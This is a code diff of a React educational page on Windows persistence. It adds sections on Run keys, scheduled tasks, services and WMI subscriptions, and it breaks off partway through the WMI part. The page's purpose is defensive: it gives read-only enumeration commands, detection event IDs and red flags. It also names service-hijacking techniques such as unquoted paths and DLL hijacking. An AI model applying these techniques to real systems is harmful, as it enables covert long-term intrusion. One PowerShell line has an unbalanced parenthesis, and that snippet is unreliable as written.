@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import LearnPageLayout from "../components/LearnPageLayout";
 import QuizSection, { QuizQuestion } from "../components/QuizSection";
 import {
@@ -6,8 +6,6 @@ import {
   Container,
   Typography,
   Paper,
-  Tabs,
-  Tab,
   Chip,
   Button,
   Accordion,
@@ -27,6 +25,13 @@ import {
   IconButton,
   Tooltip,
   alpha,
+  useTheme,
+  useMediaQuery,
+  Drawer,
+  Fab,
+  LinearProgress,
+  Divider,
+  Alert,
 } from "@mui/material";
 import ArrowBackIcon from "@mui/icons-material/ArrowBack";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
@@ -39,22 +44,37 @@ import SearchIcon from "@mui/icons-material/Search";
 import CheckCircleIcon from "@mui/icons-material/CheckCircle";
 import WarningIcon from "@mui/icons-material/Warning";
 import QuizIcon from "@mui/icons-material/Quiz";
+import ListAltIcon from "@mui/icons-material/ListAlt";
+import CloseIcon from "@mui/icons-material/Close";
+import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
+import SchoolIcon from "@mui/icons-material/School";
 import { Link, useNavigate } from "react-router-dom";
 
-interface TabPanelProps {
-  children?: React.ReactNode;
-  index: number;
-  value: number;
-}
+const theme = {
+  primary: "#3b82f6",
+  primaryLight: "#60a5fa",
+  secondary: "#a5b4fc",
+  accent: "#8b5cf6",
+  success: "#10b981",
+  warning: "#f59e0b",
+  info: "#3b82f6",
+  text: "#e2e8f0",
+  textMuted: "#94a3b8",
+  bgDark: "#0a0d18",
+  bgCard: "#111424",
+  bgNested: "#0c0f1c",
+  border: "rgba(255,255,255,0.08)",
+};
 
-function TabPanel(props: TabPanelProps) {
-  const { children, value, index, ...other } = props;
-  return (
-    <div role="tabpanel" hidden={value !== index} {...other}>
-      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
-    </div>
-  );
-}
+const sectionNavItems = [
+  { id: "intro", label: "Introduction", icon: <AutorenewIcon /> },
+  { id: "overview", label: "Overview", icon: <SecurityIcon /> },
+  { id: "categories", label: "Categories", icon: <StorageIcon /> },
+  { id: "common-locations", label: "Common Locations", icon: <SearchIcon /> },
+  { id: "detection-logs", label: "Detection & Logs", icon: <BuildIcon /> },
+  { id: "beginner-lab", label: "Beginner Lab", icon: <SchoolIcon /> },
+  { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon /> },
+];
 
 const CodeBlock: React.FC<{ code: string; language?: string }> = ({
   code,
@@ -1087,7 +1107,6 @@ const quizQuestions: QuizQuestion[] = [
 
 const WindowsPersistenceMechanismsPage: React.FC = () => {
   const navigate = useNavigate();
-  const [tabValue, setTabValue] = useState(0);
 
   const pageContext = `This page covers Windows persistence mechanisms used by attackers to maintain access after initial compromise. Categories include Registry Run Keys, Scheduled Tasks, Services, Startup Folders, WMI Event Subscriptions, Winlogon and LSA, Logon Scripts and GPO, and AppInit/DLL Search Order hijacking. Common locations covered: HKCU/HKLM Run keys, Task Scheduler Library, Windows Services, Startup folders, WMI EventFilter/Consumer, Winlogon shell/userinit, and AppInit_DLLs. The page includes a persistence lifecycle model, MITRE ATT&CK mappings, triage prompts, risky path guidance, detection signals, useful Windows Event IDs (4688, 4697, 4698, 7045, Sysmon 1/13), hardening checklists, safe enumeration commands, and beginner lab exercises.`;
 
@@ -1358,10 +1377,82 @@ Observed by: <command used>
 Why it matters: <risk or policy note>
 Recommendation: <remove, restrict, allowlist, monitor>`;
 
+  const muiTheme = useTheme();
+  const isMobile = useMediaQuery(muiTheme.breakpoints.down("md"));
+  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
+  const [activeSection, setActiveSection] = useState("intro");
+
+  const scrollToSection = (sectionId: string) => {
+    const element = document.getElementById(sectionId);
+    if (element) {
+      element.scrollIntoView({ behavior: "smooth", block: "start" });
+      setActiveSection(sectionId);
+      setNavDrawerOpen(false);
+    }
+  };
+
+  useEffect(() => {
+    const handleScroll = () => {
+      const sections = sectionNavItems.map((item) => item.id);
+      for (const sectionId of sections) {
+        const element = document.getElementById(sectionId);
+        if (element) {
+          const rect = element.getBoundingClientRect();
+          if (rect.top <= 150 && rect.bottom >= 150) {
+            setActiveSection(sectionId);
+            break;
+          }
+        }
+      }
+    };
+    window.addEventListener("scroll", handleScroll);
+    return () => window.removeEventListener("scroll", handleScroll);
+  }, []);
+
+  const progress = ((sectionNavItems.findIndex((item) => item.id === activeSection) + 1) / sectionNavItems.length) * 100;
+
+  const sidebarNav = (
+    <Box sx={{ p: 2 }}>
+      <LinearProgress variant="determinate" value={progress} sx={{ mb: 2, height: 6, borderRadius: 3, bgcolor: alpha(theme.primary, 0.2), "& .MuiLinearProgress-bar": { bgcolor: theme.primary } }} />
+      <List dense>
+        {sectionNavItems.map((item) => (
+          <ListItem
+            key={item.id}
+            component="div"
+            onClick={() => scrollToSection(item.id)}
+            sx={{
+              borderRadius: 1,
+              mb: 0.5,
+              cursor: "pointer",
+              bgcolor: activeSection === item.id ? alpha(theme.primary, 0.15) : "transparent",
+              borderLeft: activeSection === item.id ? `3px solid ${theme.primary}` : "3px solid transparent",
+              "&:hover": { bgcolor: alpha(theme.primary, 0.1) },
+            }}
+          >
+            <ListItemIcon sx={{ minWidth: 36, color: activeSection === item.id ? theme.primary : "grey.500" }}>
+              {item.icon}
+            </ListItemIcon>
+            <ListItemText primary={item.label} primaryTypographyProps={{ variant: "body2", sx: { color: activeSection === item.id ? theme.primary : "grey.400", fontWeight: activeSection === item.id ? 600 : 400 } }} />
+          </ListItem>
+        ))}
+      </List>
+    </Box>
+  );
+
   return (
     <LearnPageLayout pageTitle="Windows Persistence Mechanisms" pageContext={pageContext}>
-    <Box sx={{ minHeight: "100vh", bgcolor: "#0a0d18", py: 4 }}>
-      <Container maxWidth="lg">
+    <Box sx={{ minHeight: "100vh", bgcolor: theme.bgDark, py: 4 }}>
+      <Container maxWidth="xl">
+        <Grid container spacing={3}>
+        {/* Sidebar Navigation */}
+        <Grid item xs={12} md={2.5} sx={{ display: { xs: "none", md: "block" } }}>
+          <Paper sx={{ position: "sticky", top: 80, bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden" }}>
+            {sidebarNav}
+          </Paper>
+        </Grid>
+
+        {/* Main Content */}
+        <Grid item xs={12} md={9.5}>
         <Chip
           component={Link}
           to="/learn"
@@ -1372,13 +1463,15 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
           sx={{ borderRadius: 2, mb: 2 }}
         />
 
+        {/* Section: Introduction */}
+        <Box id="intro" sx={{ scrollMarginTop: 80 }}>
         <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
-          <AutorenewIcon sx={{ fontSize: 42, color: "#3b82f6" }} />
+          <AutorenewIcon sx={{ fontSize: 42, color: theme.primary }} />
           <Typography
             variant="h3"
             sx={{
               fontWeight: 700,
-              background: "linear-gradient(135deg, #3b82f6 0%, #60a5fa 100%)",
+              background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.primaryLight} 100%)`,
               backgroundClip: "text",
               WebkitBackgroundClip: "text",
               color: "transparent",
@@ -1390,7 +1483,132 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
         <Typography variant="h6" sx={{ color: "grey.400", mb: 2 }}>
           Persistence is how attackers make sure they can get back into a system after the first compromise.
         </Typography>
-        <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
+
+        {/* Why Persistence is Critical */}
+        <Paper sx={{ p: 3, mb: 3, bgcolor: alpha(theme.primary, 0.03), borderRadius: 3, border: `1px solid ${alpha(theme.primary, 0.2)}` }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: theme.primary }}>
+            Why Persistence is the Attacker's Top Priority
+          </Typography>
+          <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+            In real-world breaches, initial access is often fleeting. An attacker might exploit a vulnerability, phish credentials, or
+            leverage a misconfiguration to gain their first foothold. But that access is fragile—if the user logs off, the system reboots,
+            or the vulnerability gets patched, the attacker loses their access completely. That's why persistence is so critical.
+          </Typography>
+          <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+            Persistence mechanisms allow attackers to survive these disruptions. By planting a scheduled task, modifying a registry Run key,
+            or creating a Windows service, the attacker ensures their malware executes automatically after a reboot, user logon, or specific
+            system event. This transforms a one-time breach into a long-term compromise, giving attackers time to escalate privileges,
+            move laterally, exfiltrate data, and achieve their ultimate objectives.
+          </Typography>
+          <Typography variant="body2" sx={{ color: "grey.300" }}>
+            The challenge for defenders is that Windows provides dozens of legitimate persistence mechanisms designed for system administration,
+            software updates, and user convenience. Attackers abuse these same features, making malicious persistence blend in with normal
+            system behavior. Understanding where these mechanisms exist and how to audit them is essential for detecting and removing
+            attacker footholds before they can cause serious damage.
+          </Typography>
+        </Paper>
+
+        {/* Real-World Impact */}
+        <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#dc2626", 0.03), borderRadius: 2, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
+            Real-World Breach Examples: Persistence in Action
+          </Typography>
+          <Grid container spacing={2}>
+            <Grid item xs={12} md={4}>
+              <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2, height: "100%" }}>
+                <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
+                  APT29 (Cozy Bear) - WMI Persistence
+                </Typography>
+                <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
+                  Used WMI event subscriptions to maintain access in government networks. WMI persistence is fileless, stored in the
+                  WMI repository, and extremely stealthy. Detection required specialized WMI monitoring tools.
+                </Typography>
+              </Paper>
+            </Grid>
+            <Grid item xs={12} md={4}>
+              <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
+                <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
+                  Emotet - Run Keys & Services
+                </Typography>
+                <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
+                  Banking trojan that persisted via HKCU Run keys and Windows services. Used randomized service names to evade
+                  detection. Infected over 1.6 million computers worldwide before takedown in 2021.
+                </Typography>
+              </Paper>
+            </Grid>
+            <Grid item xs={12} md={4}>
+              <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
+                <Typography variant="subtitle2" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 1 }}>
+                  SolarWinds - Scheduled Tasks
+                </Typography>
+                <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
+                  SUNBURST backdoor used scheduled tasks disguised as legitimate software update checks. Persisted for months
+                  in Fortune 500 companies and government agencies before discovery in December 2020.
+                </Typography>
+              </Paper>
+            </Grid>
+          </Grid>
+        </Paper>
+
+        {/* The Persistence Landscape */}
+        <Paper sx={{ p: 3, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: theme.primary }}>
+            The Windows Persistence Landscape: Why So Many Techniques?
+          </Typography>
+          <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+            Windows has evolved over 30+ years, accumulating dozens of autostart mechanisms designed for different purposes.
+            Some date back to Windows NT (like Run keys), while others are modern (like COM hijacking). This creates a vast
+            attack surface that defenders must monitor.
+          </Typography>
+          <Grid container spacing={2}>
+            <Grid item xs={12} md={6}>
+              <Paper sx={{ p: 2, bgcolor: alpha(theme.primary, 0.05), borderRadius: 2 }}>
+                <Typography variant="subtitle2" sx={{ color: theme.primary, fontWeight: 700, mb: 1 }}>
+                  💡 Easy to Implement (Low Privilege)
+                </Typography>
+                <List dense>
+                  {[
+                    "HKCU Registry Run keys - No admin required",
+                    "User Startup folder - Simple file drop",
+                    "Scheduled tasks (user context) - Built-in tool",
+                    "Shortcut hijacking - Modify .lnk files",
+                  ].map((item) => (
+                    <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
+                      <ListItemIcon sx={{ minWidth: 24 }}>
+                        <CheckCircleIcon sx={{ fontSize: 14, color: theme.primary }} />
+                      </ListItemIcon>
+                      <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.85rem" }} />
+                    </ListItem>
+                  ))}
+                </List>
+              </Paper>
+            </Grid>
+            <Grid item xs={12} md={6}>
+              <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
+                <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
+                  🔒 Require Admin/SYSTEM Privileges
+                </Typography>
+                <List dense>
+                  {[
+                    "HKLM Registry Run keys - Affects all users",
+                    "Windows Services - Starts before logon",
+                    "Winlogon modifications - Controls logon process",
+                    "LSA Security Packages - Deep system integration",
+                  ].map((item) => (
+                    <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
+                      <ListItemIcon sx={{ minWidth: 24 }}>
+                        <WarningIcon sx={{ fontSize: 14, color: "#dc2626" }} />
+                      </ListItemIcon>
+                      <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.85rem" }} />
+                    </ListItem>
+                  ))}
+                </List>
+              </Paper>
+            </Grid>
+          </Grid>
+        </Paper>
+
+        <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
           <Typography variant="body1" sx={{ color: "grey.300", mb: 1 }}>
             In simple terms, persistence means "staying put." If someone gains access to a Windows machine, they may
             add a task, service, or registry entry so their code runs again after reboot or logon. This page shows
@@ -1411,30 +1629,23 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
           <Chip icon={<SearchIcon />} label="Scheduled Tasks" size="small" />
           <Chip icon={<BuildIcon />} label="Detection" size="small" />
         </Box>
+        </Box>
 
-        <Paper sx={{ bgcolor: "#111424", borderRadius: 2 }}>
-          <Tabs
-            value={tabValue}
-            onChange={(_, v) => setTabValue(v)}
-            variant="scrollable"
-            scrollButtons="auto"
-            sx={{
-              borderBottom: "1px solid rgba(255,255,255,0.08)",
-              "& .MuiTab-root": { color: "grey.400" },
-              "& .Mui-selected": { color: "#3b82f6" },
-            }}
-          >
-            <Tab icon={<SecurityIcon />} label="Overview" />
-            <Tab icon={<StorageIcon />} label="Categories" />
-            <Tab icon={<SearchIcon />} label="Common Locations" />
-            <Tab icon={<BuildIcon />} label="Detection and Logs" />
-            <Tab icon={<WarningIcon />} label="Beginner Lab" />
-          </Tabs>
+        {/* Section: Overview */}
+        <Box id="overview" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
+            <Box sx={{ mb: 3 }}>
+              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
+                <SecurityIcon sx={{ color: theme.primary }} />
+                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.primaryLight} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
+                  Overview
+                </Typography>
+              </Box>
+              <Divider sx={{ mt: 2, borderColor: theme.border }} />
+            </Box>
 
-          <TabPanel value={tabValue} index={0}>
-            <Box sx={{ p: 3 }}>
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                   Learning Objectives
                 </Typography>
                 <List dense>
@@ -1595,24 +1806,329 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
                   ))}
                 </List>
               </Paper>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          <TabPanel value={tabValue} index={1}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Categories */}
+        <Box id="categories" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
+            <Box sx={{ mb: 3 }}>
+              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
+                <StorageIcon sx={{ color: theme.secondary }} />
+                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.secondary} 0%, ${theme.primary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
+                  Categories
+                </Typography>
+              </Box>
+              <Divider sx={{ mt: 2, borderColor: theme.border }} />
+            </Box>
+
+              {/* Deep Dive: Registry Run Keys */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha(theme.primary, 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: theme.primary }}>
+                  1. Registry Run Keys: The Classic Persistence Method
+                </Typography>
+                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+                  Registry Run keys are the most commonly abused persistence mechanism in Windows. First introduced in Windows 95, these registry
+                  locations tell Windows which programs to execute automatically when a user logs in. While designed for legitimate software that
+                  needs to start with the user session (like antivirus, cloud sync, system tray utilities), attackers love Run keys because they're
+                  simple to use, require no special tools, and work on every version of Windows.
+                </Typography>
+                <Grid container spacing={2} sx={{ mb: 2 }}>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ color: "#3b82f6", fontWeight: 700, mb: 1 }}>
+                        User-Level Run Keys (HKCU)
+                      </Typography>
+                      <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem", mb: 1 }}>
+                        <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>
+                      </Typography>
+                      <Typography variant="body2" sx={{ color: "grey.400", fontSize: "0.85rem" }}>
+                        • No admin rights required to modify<br/>
+                        • Executes only for the current user<br/>
+                        • Most common for low-privilege malware<br/>
+                        • Example: Emotet, Trickbot, ransomware droppers
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
+                        System-Level Run Keys (HKLM)
+                      </Typography>
+                      <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem", mb: 1 }}>
+                        <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>
+                      </Typography>
+                      <Typography variant="body2" sx={{ color: "grey.400", fontSize: "0.85rem" }}>
+                        • Requires admin/SYSTEM privileges<br/>
+                        • Executes for ALL users on the system<br/>
+                        • Higher impact, easier to detect<br/>
+                        • Example: Rootkits, advanced persistent threats
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                </Grid>
+                <Alert severity="warning" sx={{ mb: 2 }}>
+                  <Typography variant="body2">
+                    <strong>Detection Tip:</strong> Monitor for registry writes to Run/RunOnce keys using Sysmon Event ID 13 or Windows registry auditing.
+                    Pay special attention to entries pointing to <code>%TEMP%</code>, <code>%APPDATA%</code>, or UNC paths—these are almost always malicious.
+                  </Typography>
+                </Alert>
+                <CodeBlock language="powershell" code={`# Enumerate all Run keys (read-only)
+reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+
+# PowerShell alternative with more details
+Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" |
+  Select-Object PSChildName, *`} />
+              </Paper>
+
+              {/* Deep Dive: Scheduled Tasks */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
+                  2. Scheduled Tasks: Flexible and Powerful
+                </Typography>
+                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+                  Windows Task Scheduler is a powerful automation framework that allows programs to run on schedules, at system events, or when
+                  specific conditions are met. While essential for legitimate system administration (Windows Update, backups, maintenance), it's
+                  also a favorite of attackers because tasks can run with SYSTEM privileges, trigger at boot (before user logon), and be hidden
+                  from casual inspection.
+                </Typography>
+                <Grid container spacing={2} sx={{ mb: 2 }}>
+                  <Grid item xs={12} md={4}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
+                      <Typography variant="subtitle2" sx={{ color: "#22c55e", fontWeight: 700, mb: 1 }}>
+                        🎯 Trigger Types
+                      </Typography>
+                      <List dense disablePadding>
+                        {[
+                          "At Logon - Runs when user signs in",
+                          "At Startup - Runs at system boot",
+                          "On Schedule - Daily, weekly, monthly",
+                          "On Event - Windows event log trigger",
+                          "On Idle - When system is inactive",
+                        ].map((item) => (
+                          <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
+                            <ListItemIcon sx={{ minWidth: 20 }}>
+                              <CheckCircleIcon sx={{ fontSize: 12, color: "#22c55e" }} />
+                            </ListItemIcon>
+                            <ListItemText primary={item} primaryTypographyProps={{ variant: "caption" }} />
+                          </ListItem>
+                        ))}
+                      </List>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
+                      <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
+                        ⚠️ Red Flags
+                      </Typography>
+                      <List dense disablePadding>
+                        {[
+                          "Task runs from %TEMP% or %APPDATA%",
+                          "Created by non-admin user account",
+                          "Randomized task name (e.g., A1B2C3D4)",
+                          "Runs with SYSTEM but created recently",
+                          "Action is PowerShell with -Encoded flag",
+                        ].map((item) => (
+                          <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
+                            <ListItemIcon sx={{ minWidth: 20 }}>
+                              <WarningIcon sx={{ fontSize: 12, color: "#f59e0b" }} />
+                            </ListItemIcon>
+                            <ListItemText primary={item} primaryTypographyProps={{ variant: "caption" }} />
+                          </ListItem>
+                        ))}
+                      </List>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
+                      <Typography variant="subtitle2" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 1 }}>
+                        🔍 Detection Events
+                      </Typography>
+                      <List dense disablePadding>
+                        {[
+                          "Security 4698 - Task created",
+                          "Security 4699 - Task deleted",
+                          "Security 4700 - Task enabled",
+                          "Security 4702 - Task updated",
+                          "System 106 - Task registered (TaskScheduler/Operational)",
+                        ].map((item) => (
+                          <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
+                            <ListItemIcon sx={{ minWidth: 20 }}>
+                              <CheckCircleIcon sx={{ fontSize: 12, color: "#8b5cf6" }} />
+                            </ListItemIcon>
+                            <ListItemText primary={item} primaryTypographyProps={{ variant: "caption" }} />
+                          </ListItem>
+                        ))}
+                      </List>
+                    </Paper>
+                  </Grid>
+                </Grid>
+                <CodeBlock language="powershell" code={`# List all scheduled tasks with details
+Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} |
+  Select-Object TaskName, TaskPath, State, @{N="Author";E={$_.Principal.UserId}},
+    @{N="RunLevel";E={$_.Principal.RunLevel}} | Format-Table -AutoSize
+
+# Check task actions (what the task actually does)
+Get-ScheduledTask | ForEach-Object {
+  [PSCustomObject]@{
+    Name = $_.TaskName
+    Action = $_.Actions.Execute
+    Arguments = $_.Actions.Arguments
+    WorkingDir = $_.Actions.WorkingDirectory
+  }
+} | Where-Object {$_.Action -like "*powershell*" -or $_.Action -like "*cmd*"}`} />
+              </Paper>
+
+              {/* Deep Dive: Windows Services */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#dc2626", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
+                  3. Windows Services: The Stealthiest Persistence
+                </Typography>
+                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+                  Windows Services are programs that run in the background, often starting before any user logs in and continuing to run until
+                  shutdown. They're managed by the Service Control Manager (SCM) and typically run with SYSTEM privileges. This makes them
+                  incredibly powerful for persistence—a malicious service starts automatically at boot, runs with the highest privileges, and
+                  doesn't depend on any user being logged in.
+                </Typography>
+                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+                  The challenge is that Windows systems run dozens of legitimate services, making it easy for attackers to hide malicious ones
+                  among the noise. Advanced attackers often mimic legitimate service names (e.g., "WinDefenderUpdate" instead of "WinDefend") or
+                  even hijack existing stopped services by replacing their binary paths.
+                </Typography>
+                <Grid container spacing={2} sx={{ mb: 2 }}>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
+                        Why Attackers Love Services
+                      </Typography>
+                      <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
+                        • Starts before user logon (pre-login persistence)<br/>
+                        • Runs as SYSTEM (highest local privilege)<br/>
+                        • Survives user logoff and account deletion<br/>
+                        • Can be set to auto-restart on failure<br/>
+                        • Difficult to spot among legitimate services<br/>
+                        • Example: TrickBot, Ryuk, SolarWinds SUNBURST
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
+                        Service Hijacking Techniques
+                      </Typography>
+                      <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
+                        • <strong>Unquoted Service Paths:</strong> Exploit spaces in paths without quotes<br/>
+                        • <strong>Weak Permissions:</strong> Replace service binary if writable<br/>
+                        • <strong>DLL Hijacking:</strong> Place malicious DLL in service directory<br/>
+                        • <strong>Service Creation:</strong> Create entirely new service<br/>
+                        • <strong>Modify Existing:</strong> Change ImagePath of disabled service
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                </Grid>
+                <CodeBlock language="powershell" code={`# List all services and their binaries
+Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode, State, StartName | Format-Table -AutoSize
+
+# Find suspicious service paths (user-writable locations)
+Get-WmiObject win32_service | Where-Object {
+  $_.PathName -like "*Temp*" -or
+  $_.PathName -like "*AppData*" -or
+  $_.PathName -like "*Users\\*"
+} | Select-Object Name, PathName, StartMode
+
+# Check for unsigned service binaries
+Get-WmiObject win32_service | ForEach-Object {
+  $path = $_.PathName -replace '"', '' -split ' ')[0]
+  if (Test-Path $path) {
+    $sig = Get-AuthenticodeSignature $path
+    if ($sig.Status -ne 'Valid') {
+      [PSCustomObject]@{Service=$_.Name; Path=$path; SignatureStatus=$sig.Status}
+    }
+  }
+}`} />
+              </Paper>
+
+              {/* Deep Dive: WMI Event Subscriptions */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
+                  4. WMI Event Subscriptions: The Fileless Persistence
+                </Typography>
+                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+                  Windows Management Instrumentation (WMI) is a powerful framework for system administration that can monitor events and
+                  automatically execute actions when those events occur. APT groups like APT29 (Cozy Bear) have abused WMI persistence because
+                  it's incredibly stealthy—the malicious code is stored in the WMI repository (CIM database) rather than on disk, making it
+                  invisible to traditional file-based scanning.
+                </Typography>
+                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
+                  WMI persistence consists of three components: an <strong>EventFilter</strong> (what to watch for), a <strong>Consumer</strong> (what
+                  to do), and a <strong>FilterToConsumerBinding</strong> (connecting the two). For example, an EventFilter might watch for user logon,
+                  and the Consumer might execute a PowerShell payload stored in the WMI repository itself.
+                </Typography>
+                <Grid container spacing={2} sx={{ mb: 2 }}>
+                  <Grid item xs={12} md={4}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, textAlign: "center" }}>
+                      <Typography variant="subtitle2" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 1 }}>
+                        1️⃣ EventFilter
+                      </Typography>
+                      <Typography variant="caption" sx={{ color: "grey.400" }}>
+                        Defines WHAT event to monitor (e.g., "User logs in", "Process starts", "File created")
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, textAlign: "center" }}>
+                      <Typography variant="subtitle2" sx={{ color: "#22c55e", fontWeight: 700, mb: 1 }}>
+                        2️⃣ Consumer
+                      </Typography>
+                      <Typography variant="caption" sx={{ color: "grey.400" }}>
